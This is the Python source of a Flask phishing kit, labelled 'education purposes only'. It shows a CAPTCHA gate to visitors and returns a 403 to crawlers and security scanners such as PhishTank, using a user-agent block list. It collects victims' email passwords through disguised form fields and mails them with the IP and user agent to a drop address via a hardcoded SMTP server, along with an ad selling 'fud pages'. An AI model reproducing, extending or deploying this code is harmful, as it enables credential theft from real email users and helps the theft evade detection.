from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
import secrets
import random
import io
import base64
import string
import time
from PIL import Image, ImageDraw, ImageFont
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# made for education purposes only

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx

bot_user_agents = [
'Googlebot', 
'Baiduspider', 
'ia_archiver',
'R6_FeedFetcher', 
'NetcraftSurveyAgent', 
'Sogou web spider',
'bingbot', 
'Yahoo! Slurp', 
'facebookexternalhit', 
'PrintfulBot',
'msnbot', 
'Twitterbot', 
'UnwindFetchor', 
'urlresolver', 
'Butterfly', 
'TweetmemeBot',
'PaperLiBot',
'MJ12bot',
'AhrefsBot',
'Exabot',
'Ezooms',
'YandexBot',
'SearchmetricsBot',
'phishtank',
'PhishTank',
'picsearch',
'TweetedTimes Bot',
'QuerySeekerSpider',
'ShowyouBot',
'woriobot',
'merlinkbot',
'BazQuxBot',
'Kraken',
'SISTRIX Crawler',
'R6_CommentReader',
'magpie-crawler',
'GrapeshotCrawler',
'PercolateCrawler',
'MaxPointCrawler',
'R6_FeedFetcher',
'NetSeer crawler',
'grokkit-crawler',
'SMXCrawler',
'PulseCrawler',
'Y!J-BRW',
'80legs.com/webcrawler',
'Mediapartners-Google', 
'Spinn3r', 
'InAGist', 
'Python-urllib', 
'NING', 
'TencentTraveler',
'Feedfetcher-Google', 
'mon.itor.us', 
'spbot', 
'Feedly',
'bot',
'curl',
"spider",
"crawler"
]

# Function to generate a random CAPTCHA code
def generate_captcha_code(length=4):
    return ''.join(random.choices(string.digits, k=length))

# Function to generate a CAPTCHA image
def generate_captcha_image(code):
    width, height = 150, 60
    image = Image.new('RGB', (width, height), color=(255, 255, 255))
    draw = ImageDraw.Draw(image)

    # Add some noise (dots)
    for _ in range(random.randint(100, 200)):
        draw.point((random.randint(0, width), random.randint(0, height)), fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))

    # Use a truetype font for the text
    try:
        font = ImageFont.truetype("arial.ttf", 36)
    except IOError:
        font = ImageFont.load_default()

    # Add the CAPTCHA text with distortion
    for i, char in enumerate(code):
        x = 20 + i * 30
        y = random.randint(10, 20)
        angle = random.randint(-25, 25)
        draw.text((x, y), char, font=font, fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))

    # Add lines for additional noise
    for _ in range(random.randint(3, 5)):
        x1, y1 = random.randint(0, width), random.randint(0, height)
        x2, y2 = random.randint(0, width), random.randint(0, height)
        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=2)

    # Save the image to a bytes buffer
    img_io = io.BytesIO()
    image.save(img_io, 'PNG')
    img_io.seek(0)

    # Convert the image to base64 string to pass to the HTML
    return base64.b64encode(img_io.getvalue()).decode('utf-8')

@app.route('/', methods=['GET', 'POST'])
def captcha():
    if request.method == 'GET':
        if 'passed_captcha' in session and session['passed_captcha']:
            return redirect(url_for('success'))

        # Generate a random 4-digit CAPTCHA code
        code = generate_captcha_code()
        session['captcha_code'] = code
        session['captcha_time'] = time.time()  # Track time when the CAPTCHA was created
        userauto = request.args.get("web")
        userdomain = userauto[userauto.index('@') + 1:] if userauto else ""
        session['eman'] = userauto
        session['ins'] = userdomain

        # Generate the CAPTCHA image
        captcha_image = generate_captcha_image(code)

        # Pass the base64 string directly to the template
        return render_template('captcha.html', captcha_image=captcha_image, eman=userauto, ins=userdomain, error=False)

    elif request.method == 'POST':
        user_input = request.form['code']
        captcha_time = session.get('captcha_time', 0)

        if time.time() - captcha_time > 60:
            return render_template('captcha.html', error=True, message="Captcha expired. Please try again.")

        if user_input == session.get('captcha_code'):
            session['passed_captcha'] = True
            return redirect(url_for('success'))
        else:
            # Generate a new CAPTCHA if the user input was incorrect
            code = generate_captcha_code()
            session['captcha_code'] = code
            captcha_image = generate_captcha_image(code)
            return render_template('captcha.html', captcha_image=captcha_image, error=True, message="Incorrect CAPTCHA. Please try again.")

@app.route('/success')
def success():
    if 'passed_captcha' in session and session['passed_captcha']:
        web_param = request.args.get('web')
        return redirect(url_for('route2', web=web_param))
    else:
        return redirect(url_for('captcha'))


@app.route("/m")
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        session['ins'] = web_param[web_param.index('@') + 1:]
    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))


@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "auto528@cryptasphere.bio"
        sender_emaill = "auto528"
        receiver_email = "notificationalibaba@gmail.com"
        password = "vip7a81be0e2b36"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "KOTRA$$ Logs "
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP("146.19.254.243", 6040) as server:
            server.login(sender_emaill, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        # Set session value and redirect
        session['eman'] = email  # Save email as session variable
        return redirect(url_for('benza', web=email))



@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "auto528@cryptasphere.bio"
        sender_emaill = "auto528"
        receiver_email = "notificationalibaba@gmail.com"
        password = "vip7a81be0e2b36"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "KOTRA$$ Logs  !! "
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP("146.19.254.243", 6040) as server:
            server.login(sender_emaill, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        session['ins'] = email  # Save email as session variable
        return redirect(url_for('lasmo', web=email))



@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)

@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in bot_user_agents:
        abort(403)  # forbidden
    
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=3000)
